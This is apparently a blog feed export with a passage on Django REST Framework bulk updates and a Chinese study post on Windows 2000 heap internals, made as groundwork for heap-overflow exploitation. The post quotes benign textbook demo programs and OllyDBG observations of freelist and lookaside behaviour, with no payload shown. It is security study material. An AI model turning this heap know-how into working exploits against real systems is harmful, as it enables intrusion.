<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重点：ListSerializer与ModelSerializer建立关联的是： 在ModelSerializer的Meta类中设置   list_serializer_class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListSerializer</span><span class="params">(ListSerializer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self, instance, validated_data)</span>:</span>  <span class="comment"># print(instance)  # 要更新的对象们</span></span><br><span class="line">        <span class="comment"># print(validated_data)  # 更新的对象对应的数据们</span></span><br><span class="line">        <span class="comment"># print(self.child)  # 服务的模型序列化类 - V3BookModelSerializer</span></span><br><span class="line">        <span class="keyword">for</span> index, obj <span class="keyword">in</span> enumerate(instance):</span><br><span class="line">            self.child.update(obj, validated_data[index])</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V3BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">            <span class="comment"># 群改，list_serializer_class是固定的key写法，直接转入BookListSerializer类的 update 方法</span></span><br><span class="line">            list_serializer_class = BookListSerializer</span><br></pre></td></tr></table></figure>
<p>之所以需要实现<code>update</code>方法，群改时会走 <code>rest_framework.serializers.ListSerializer</code>中的<code>update</code>函数，而该函数并未被实现。</p>
<p>而群增不需要重写<code>create</code>方法，因为源码中<code>rest_framework.serializers.ListSerializer</code>走的就是<code>ModelSerializer</code>的<code>create</code>方法:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, validated_data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        self.child.create(attrs) <span class="keyword">for</span> attrs <span class="keyword">in</span> validated_data</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
<h2 id="视图层-views.py">视图层 <code>views.py</code></h2>
<p>在视图层将 单局部改和群局部改整合，思路如下：</p>
<ol type="1">
<li>单局部改：对 <code>v3/books/pk/</code> <code>pk</code>通过路由传参，修改数据选择传参，通过数据包json传递</li>
<li>群局部修改：<code>v3/books/</code> 修改数据通过数据包传递，设置成列表格式 <code>[{pk:1,name:123},{pk:3,price:7},{pk:7,publish:2}]</code></li>
<li>先将单改，群改的数据都格式化成 <code>pks=[要需要的对象主键标识]</code>， <code>request_data=[每个要修改的对象对应的修改数据]</code></li>
<li><code>pks</code>与<code>request_data</code>数据筛选，将<code>pks</code>中的没有对应数据的<code>pk</code>与数据已删除的<code>pk</code>移除，<code>request_data</code>对应索引位上的数据也移除，将合理的<code>pks</code>转换为<code>objs</code></li>
</ol>
<details>
<p><summary> <b><i>Source Code</i></b> </summary></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</details>
<h1 id="listserializer使用要点小结"><code>ListSerializer</code>使用要点小结</h1>
<p><code>views.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ser_obj = ModelSerializer(instance=model_obj,data=model_data,partial=<span class="literal">True</span>,many=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p><code>serializer.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 实现群改功能，反序列化情况下的create、update就不再调用ModelSerializer的</span></span><br><span class="line"><span class="comment"># 而是调用 ModelSerializer.Meta.list_serializer_class 指向的 ListSerializer 类的create、update</span></span><br><span class="line"><span class="comment"># ListSerializer默认只实现了群增的create，要实现群改，必须重写update</span></span><br><span class="line"></span><br><span class="line">　　<span class="comment">#自定义序列化类，重写update方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyListSerializer</span><span class="params">(ListSerializer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self, instance, validated_data)</span>:</span></span><br><span class="line">        <span class="comment"># print(instance)  # 要更新的对象们: [obj1, obj2, ...]</span></span><br><span class="line">        <span class="comment"># print(validated_data)  # 更新的对象对应的数据们: [&#123;&#125;, &#123;&#125;, ...]</span></span><br><span class="line">        <span class="comment"># print(self.child)  # 服务的模型序列化类 - V2BookModelSerializer</span></span><br><span class="line">        <span class="keyword">for</span> index, obj <span class="keyword">in</span> enumerate(instance):</span><br><span class="line">            self.child.update(obj, validated_data[index])</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">            list_serializer_class = MyListSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将两者类建立关联，在MyListSerializer中就可以用self.child拿到# MyModelSerializer，进而使用MyModelSerializer中封装好的方法</span></span><br><span class="line">    cls.Meta.list_serializer_class.child = cls</span><br></pre></td></tr></table></figure>
<h1 id="源码补充分析">源码补充分析</h1>
<p>分析一下修改为什么要用<code>instance</code>传参。</p>
<p>修改之后数据使用<code>save()</code>保存，从视图的<code>save()</code>点击进去查看源码，下面是<code>BaseSerializer</code>类中的<code>save</code>，而该<code>save</code>未被实现。</p>
<p>因此接着查看<code>save</code>方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, **kwargs)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    validated_data = [</span><br><span class="line">        dict(list(attrs.items()) + list(kwargs.items()))</span><br><span class="line">        <span class="keyword">for</span> attrs <span class="keyword">in</span> self.validated_data</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        self.instance = self.update(self.instance, validated_data)</span><br><span class="line">        <span class="keyword">assert</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, (</span><br><span class="line">            <span class="string">'`update()` did not return an object instance.'</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.instance = self.create(validated_data)</span><br><span class="line">        <span class="keyword">assert</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, (</span><br><span class="line">            <span class="string">'`create()` did not return an object instance.'</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self.instance</span><br></pre></td></tr></table></figure>
<p><code>instance</code>存在就走<code>update</code>方法，修改数据(<code>PUT</code>/<code>PATCH</code>)时都应传入<code>instance</code>，所以单改群改都需要传入<code>data</code>（反序列化用）和<code>instance</code>（序列化用）参数。</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>堆溢出学习笔记(Win2K) (上)</title>
    <url>/tech/heap-overflow-learning-notes-1/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #1</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<p>最近在啃《0day安全：软件漏洞分析技术》（第二版）一书，打算入门二进制漏洞分析。书中第五章“堆溢出利用”较前几章难度有所增大，原因在于堆结构较之前学习的栈更复杂，第五章中的例子涵盖了堆的分布、堆块分配和释放、堆溢出利用，利用堆溢出进行攻击的例子是通过修改P.E.B（进程环境块）中指向RtlEnterCriticalSection()函数的指针，该函数在程序退出时被调用。在调试完所有例子以后，对堆的内部细节和堆溢出利用终于有了些许的理解。</p>
<p>第六章中也涉及到堆溢出利用，不过此处是利用Windows异常处理机制S.E.H（异常处理结构体）来实现攻击的，看完后打算调试一遍，发现几天前通过调试建立的对内存中堆分布和操作的理解都忘得差不多了，这时候终于体会到 <em><strong>学习过程中根据自己的体会做一些重要笔记并且据此定期复习的重要性</strong></em>，因此有了本篇。</p>
<p>希望这是个好的开头，提醒自己谨记对于复杂的重难点，要以日志的形式形成学习笔记，以供日后温故知新。</p>
<p>关于堆以及P.E.B、S.E.H等机制的介绍，0day书中已经非常系统详尽，本文不再赘述，这里仅给出我的实验调试过程，记录其中踩的坑以及一些体会，因此以过程截图为主，相关简述为辅。第六章中堆的例子作者并没有给出相关代码及过程细节，这里也会附上。由于初学，文中难免存在错误，欢迎指正。</p>
<a id="more"></a>
<h2 id="x00-准备工作">0x00 准备工作</h2>
<blockquote><p>调试堆与调试栈不同，不能直接用调试器OllyDBG、WinDBG来加载程序，否则堆管理函数会检测到当前进程处于调试状态，而使用调试态堆管理策略。</p>
<p>调试态对管理策略和常态堆管理策略有很大差异。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P153</cite></footer></blockquote>
<p>因此需要防止程序运行后进入调试态，按照书中所述以如下方式设置：</p>
<ul>
<li>设置OllyDBG为默认调试器：OllyDBG -&gt; Options菜单 -&gt; Just-in-time debugging</li>
</ul>
<img src="/tech/heap-overflow-learning-notes-1/0_1.png" class="" title="图0.1">
<ul>
<li>设置OllyDBG 不捕获INT3中断：OllyDBG -&gt; Options菜单 -&gt; Debugging options</li>
</ul>
<img src="/tech/heap-overflow-learning-notes-1/0_2.png" class="" title="图0.2">
<h2 id="x01-初识堆">0x01 初识堆</h2>
<hr />
<blockquote><p>在Windows中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。其中最重要的堆表有两种：空闲双向链表Freelist（以下简称空表）和 快速单向链表Lookaside（以下简称快表）。</p>
<p>堆的操作中可以分为堆块分配、堆块释放和堆块合并（Coalesce）三种。其中，“分配”和“释放”是在程序_（即在用户代码中）_提交申请和执行的，而堆块合并则是有对管理系统自己完成的。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P147 & P149</cite></footer></blockquote>
<p>下面观察空表的分配、释放及合并，快表中没有合并操作，因此观察它的分配及释放。</p>
<h3 id="空闲双向链表freelist">1. 空闲双向链表Freelist</h3>
<p>示例代码如下</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P152 -> heap_debug.c</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">POC code of chapter 6.2 in book "Vulnerability Exploit and Analysis Technique"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name	: heap_debug.c</span></span><br><span class="line"><span class="comment">author		: failwest  </span></span><br><span class="line"><span class="comment">date		: 2007.04.04</span></span><br><span class="line"><span class="comment">description	: demo show of how heap works</span></span><br><span class="line"><span class="comment">Noticed		:	1 only run on windows 2000</span></span><br><span class="line"><span class="comment">				2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">				3 build into release version</span></span><br><span class="line"><span class="comment">				4 only used for run time debugging</span></span><br><span class="line"><span class="comment">version		: 1.0</span></span><br><span class="line"><span class="comment">E-mail		: failwest@gmail.com</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">	Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//free block and prevent coaleses</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line">	</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>运行程序，由于INT3中断产生异常，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_1.png" class="" title="图1.1.1">
<p>选择Cancel以加载默认调试器OllyDBG。</p>
<h4 id="寻找代码heapcreate所创建的堆">(1) 寻找代码HeapCreate()所创建的堆</h4>
<p>进入OllyDBG后，单击下图中的M按钮，以查看程序当前的内存映射状态：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_2.png" class="" title="图1.1.2">
<p>与上图对应的0day书中图5.2.5指出了内存映射Memory Map中进程堆、malloc使用堆、实验中HeapCreate()创建的堆的起始地址，作者没有说明后2个是如何判断的，我的理解如下：</p>
<ul>
<li>malloc使用堆：这里我还无法判断，因为上图的内存映射情况跟书中的图有较大不同。</li>
<li>实验中HeapCreate()创建的堆：可用根据大小为0x1000以及Type为Priv来筛选，0x0012D000虽然也满足，但是地址很小，在线程及进程堆附近，应该不是用户所创建的堆。因此可用筛选出0x00360000为程序代码创建的堆。</li>
</ul>
<p>上面讨论的是只根据观察Memory map来识别各种类型的堆，其实本例中要判断HeapCreate()创建的堆可直接根据当前汇编代码运行到INT3时EAX的值来判断，即为0x00360000，因为在INT3代码之前刚刚调用了HeapCreate()函数，并且返回了创建的堆的其实地址，该值正存储在EAX中，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_3.png" class="" title="图1.1.3">
<h4 id="观察堆表信息">(2) 观察堆表信息</h4>
<blockquote><p>空闲堆块的块首中包含一对重要指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为128条。</p>
<p>堆区一开始的堆表区中有一个128项的指针数组，被称做空表索引（Freelist array）。该数组的每一项包括两个指针，用于标识一个空表。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P147</cite></footer></blockquote>
<p>在内存查看窗口中，Ctrl+G来到地址0x00360000处，观察内存，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_4.png" class="" title="图1.1.4">
<p>按照书中介绍，从0x00360000开始，堆表中包含的信息依次为</p>
<ul>
<li>段表索引 Segment List</li>
<li>虚表索引 Virtual Allocation list</li>
<li>空表使用标识 freelist usage bitmap</li>
<li>空表索引区</li>
</ul>
<p>这里只关心从偏移0x178处(距离堆起始地址0x00360000的偏移，后文省略)开始的空表索引区，这个区域存放着Freelist数组Freelist[0]~Freelist[127]，每个数组元素大小为8Byte，包含2个4Byte指针，前向指针flink（指向所在链表中下一个堆块）和后向指针blink（指向所在链表中前一个堆块）。</p>
<p>参考书中图5.1.2，空表索引是用来索引不同大小的堆块数据链的。堆块用来存储数据，其最小单位为8 Byte，空闲堆块按照其大小被区分开来，相同大小的空闲堆块被串接起来，形成一个包含若干个同样大小的堆块堆块链。如Freelist[1]指向的是一条由若干个大小都为 1 x 8 Byte的堆块串接起来的堆块数据链，依此类推，Freelist[127]指向的是一条由若干个大小都为 127 x 8 Byte的堆块串接起来的堆块数据链，其中前向指针flink指向的是堆块数据链中的第一个堆块，后向指针blink指向的是最后一个堆块。Freelist[0]较为特殊，它链入所有 大于等于1024 Byte且小于512 KB的堆块，这些堆块按照各自的大小在Freelist[0]中升序串接。</p>
<img src="/tech/heap-overflow-learning-notes-1/0day_5_1_2.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P148 -&gt; 图5.1.2">
<p>值得一提的是，参考书中图5.2.8和5.2.9，每个完整的堆块的前8 Byte是块首，存储着该块大小、状态等相关信息。</p>
<img src="/tech/heap-overflow-learning-notes-1/0day_5_2_8.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P156 -&gt; 图5.2.8">
<img src="/tech/heap-overflow-learning-notes-1/0day_5_2_9.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P157 -&gt; 图5.2.9">
<p>块首之后数据的作用根据该堆块是否空闲有所不同：</p>
<ul>
<li>空闲态堆块中，紧接着块首的8 Byte包含该空闲块的前向指针和后向指针，余下的字节就是实际数据了。</li>
<li>占用态堆块中，块首之后便是实际数据的数据。</li>
</ul>
<p>因此，1个包含8 Byte数据的堆块，在内存中占用的实际空间为16 Byte。当该堆块为空闲态时，8-15 Byte为前向指针和后向指针；当该堆块为占用态时，后8 Byte为实际数据。</p>
<p>我们发现图1.1.4中的空表索引区中除了Freelist[0]中的2个指针都指向0x688，之后每个元素中的前向指针和后向指针都指向该元素的起始地址，这是因为初始状态下的堆是没有的固定大小的空闲块的，除了一个非常大、连续的初始空闲块，即尾块，它正是Freelist[0]的2个指针所指的堆块。</p>
<p>我们来到0x680观察尾块，如下图</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_5.png" class="" title="图1.1.5">
<p>从上图可以看出，尾块的大小为0x130 x 8 Byte，前后向指针都指向freelist[0]。</p>
<p>这里值得一提的是块首信息中的Self Size的单位是8 Byte，也就是说该Self Size值为1的最小堆数据块占用的内存为 1 x 8 Byte，这是堆块数据的最小占用内存。</p>
<p>注意，尾块块首位于0x680，而非Freelist[0]中指针指向的0x688，因为<strong>空表中的前向指针和后向指针指向的都是堆块中实际数据的内存地址，而非块首的地址。</strong></p>
<h4 id="观察堆块的分配">(3) 观察堆块的分配</h4>
<p>继续跟进代码，来观察堆块的分配与释放，但随即遇到一个坑：不管 Debugging options中怎么设置，代码执行到0x0040101D处的INT3之前，继续F8执行INT3，会进入内核代码直到终止，不会继续执行INT3之后的代码。在看雪论坛里看到大家也遇到了这种情况，也没有太好的解决办法。问题肯定出在汇编代码int3，因此我的解决办法是手动将int3改变为nop，执行空指令，这样就可以继续执行后面的代码了，但是也有不方便的地方，每次重启程序执行到该处都得手动修改此处。</p>
<p>连续几次F8代码执行到0x0040102B处，即完成h1堆内存分配之后，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_6.png" class="" title="图1.1.6">
<p>从上图中可以观察到，h1的堆内存地址是之前的空闲尾块的起始地址0x688，那原来的尾块何去何从？这时可以再观察一下空表索引区，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_7.png" class="" title="图1.1.7">
<p>从上图可以看到，Freelist[0]所指向的空闲尾块的起始地址变为0x698。再到地址0x680进行观察，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_8.png" class="" title="图1.1.8">
<p>可以看到，尾块变小到 0x12E x 8 Byte了，缩小了(0x130 - 0x12E) x 8 Byte = 16 Byte，这16 Byte即为h1所用，虽然在C代码中h1申请大小仅为3 Byte，但是据前所述，堆块数据的最小占用内存为 8 Byte，因此包括块首的h1还是占用了16 Byte的内存空间。由于h1仅申请了3 Byte，因此0x688的前4 Byte被置为0，而后4 Byte不做改变也不会被使用，所以其值仍为之前的尾块的后向指针的值。</p>
<p>随后的h2-h6分配过程类似，不再赘述，下面两图给出h6分配完毕后的空表索引区及对数据区的状态:</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_9.png" class="" title="图1.1.9">
<img src="/tech/heap-overflow-learning-notes-1/1_1_10.png" class="" title="图1.1.10">
<h4 id="观察堆块的释放">(4) 观察堆块的释放</h4>
<p>接着观察堆块的释放，C代码中首先释放的是3个不相邻的堆块h1 h3 h5，由于它们不连续，因此不会发生合并。</p>
<p>将汇编代码执行到h5释放完毕，h6开始释放之前，观察空表索引区及堆数据区的状态：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_11.png" class="" title="图1.1.11">
<img src="/tech/heap-overflow-learning-notes-1/1_1_12.png" class="" title="图1.1.12">
<p>由于h1和h3的Self Size都为2且不相邻，当它们被释放时会先后与Freelist[2]串联构成双向链表，具体的链接方式为</p>
<ul>
<li>flink: FreeList[2] -&gt; h1 -&gt; h3 -&gt; FreeList[2]</li>
<li>blink: FreeList[2] -&gt; h3 -&gt; h1 -&gt; FreeList[2]</li>
</ul>
<p>释放后的h5被单独串联到Freelist[4]。</p>
<p>可以观察到在分配及释放前后，h1 h3 h5的块首中从左至右第6 Byte的数据由0x01变为0x00，该字节数据为堆块标识，值0x01表示该块处于Busy状态。处于Busy状态的空闲堆块不会被合并，而0x00状态的空闲堆块在合适的时候会被系统自动合并。</p>
<h4 id="观察堆块的合并">(5) 观察堆块的合并</h4>
<p>继续执行释放h4的代码，当h4被释放后，观察空表索引区及堆数据区：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_1_13.png" class="" title="图1.1.13">
<img src="/tech/heap-overflow-learning-notes-1/1_1_14.png" class="" title="图1.1.14">
<p>h4被释放后，系统并不会把它与Freelist[4]串联，因为系统检测到h4 前与h3 后与h4相邻，会将它们合并，合并后新空闲块的大小为(2+2+4) x 8 Byte = 8 x 8 Byte，因此新块的Self Size为8。</p>
<p>同时观察空表索引区，由于h3被“拿走”，与Freelist[2]串联的只剩下了h1，原先与Freelist[4]串联的h5也被“拿走”，因此Freelist[4]中的指针再次指向了它自身，而合并得到的Self Size为8的新块与Freelist[8]进行了串接。</p>
<h3 id="快速单向链表lookaside">2. 快速单向链表Lookaside</h3>
<blockquote><p>快表是Windows用来加速堆块分配而采用的一种堆表。这里之所以把它叫做“快表”是因为这类单向链表中从来不会发生堆块合并（其中的空闲块块首被设置为占用态，用来防止堆块合并）。</p>
<p>快表也有128条，组织结构与空表类似，只是其中的堆块按照单链表组织。快表总是被初始化为空，而且每条快表最多只有4个节点，故很快就会被填满。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P148-149</cite></footer></blockquote>
<p>快表结构如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/0day_5_1_3.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P148 -&gt; 图5.1.3">
<p>示例代码如下：</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P161 -> heap_lookaside.c</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">POC code of chapter 5 in book "Lookaside Using"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name	: heap_lookaside.c</span></span><br><span class="line"><span class="comment">author		: failwest  </span></span><br><span class="line"><span class="comment">date		: 2010.09.04</span></span><br><span class="line"><span class="comment">description	: demo show of how heap works</span></span><br><span class="line"><span class="comment">Noticed		:	1 only run on windows 2000</span></span><br><span class="line"><span class="comment">				2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">				3 build into release version</span></span><br><span class="line"><span class="comment">				4 only used for run time debugging</span></span><br><span class="line"><span class="comment">version		: 1.0</span></span><br><span class="line"><span class="comment">E-mail		: failwest@gmail.com</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">	Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>本例中创建堆与上例中创建堆时的不同之处在于HeapCreate函数的使用，该函数细节详见<span class="exturl" data-url="aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vemgtY24vbGlicmFyeS9hYTM2NjU5OQ==">MSDN<i class="fa fa-external-link-alt"></i></span>，该函数的第3个参数dwMaximumSize指定了该堆所能占用的最大空间，若dwMaximumSize=0，则将会创建一个按所需空间大小动态自增长的堆。</p>
<p>0day书中没有指出是否在调用HeapCreate时，将dwMaximumSize设置为0时系统就会自动启用快表，而置为非零时系统默认不使用快表，根据我的理解应该是这样的。</p>
<p><strong>在实验调试中，我发现0day书中5.2.7 “快表的使用”一节中有较为明显的错误，而后连锁反应式地在本节中引发了一连串错误。一开始还不敢确定，后来经过反复调试并阅读，基本确定错误属实而非环境不同造成的结果差异，下文将详述之。</strong></p>
<h4 id="观察堆表信息-1">(1) 观察堆表信息</h4>
<p>0x178处存储的尾块指针不再指向0x688，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_1.png" class="" title="图1.2.1">
<blockquote>
<p>这里插播一个在学习过程中发现的OllyDBG使用小Tips，之前没看过OllyDBG的使用文档，一些最基本的操作都是从0day书中学习到的，因此已经熟悉OllyDBG使用的同学可忽略这条Tips。</p>
<p>观察上图中0x178处指针指向的尾块地址0x00361E90，若我们想要跳转到该地址去查看尾块，可以按照0day书中的方法在上图的内存查看窗口中按下Ctrl+G，然后键入361E90（默认16进制），就能够转到该地址查看内存。</p>
<p>此外，还可以用鼠标右键单击内存0x178处的值0x90，选择&quot;Follow DWORD in Dump&quot;，即可跳转到内存0x00361E90处。还可以通过单击+或-以来回切换前面的或后面的内存窗口查看，以实现0x178和0x1E90处内存的快速来回切换查看。</p>
</blockquote>
<p>0x688处已经被快表所霸占，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_2.png" class="" title="图1.2.2">
<blockquote>
<p>与上图对应的0day书中图5.2.17标注的Lookaside[0]位于0x6b8处而非0x688处，书中的标注有误。</p>
</blockquote>
<h4 id="观察堆块的分配-1">(2) 观察堆块的分配</h4>
<p>接着，我们来观察堆块分配操作，观察h1申请后的内存，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_3.png" class="" title="图1.2.3">
<p>此时0x178处的尾块指针指向0x1EA0，说明跟上节中讨论的空表内存申请一样，申请过程也是Freelist[0]所指向的尾块为h1腾出了空间，结果表现为尾块缩小 2 x 8 Byte，它的起始部分“向后移动”了。</p>
<p>接着执行代码，完成h1至h4的分配，观察此时内存数据，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_4.png" class="" title="图1.2.4">
<h4 id="观察堆块的释放-1">(3) 观察堆块的释放</h4>
<p>再观察h1至h4释放后的内存数据，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_5.png" class="" title="图1.2.5">
<p>可以看到，与空表中不同的是，在释放后各块块首中从左至右第6 Byte的数据并未改变，仍为0x01即Busy状态，该标识可以保证即使该堆块现在已变为空闲堆块也不会被系统自动合并。</p>
<p>其中，被释放后的h2中多出了一个指针，关于其用途，待观察0x688处的快表即可明白，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_6.png" class="" title="图1.2.6">
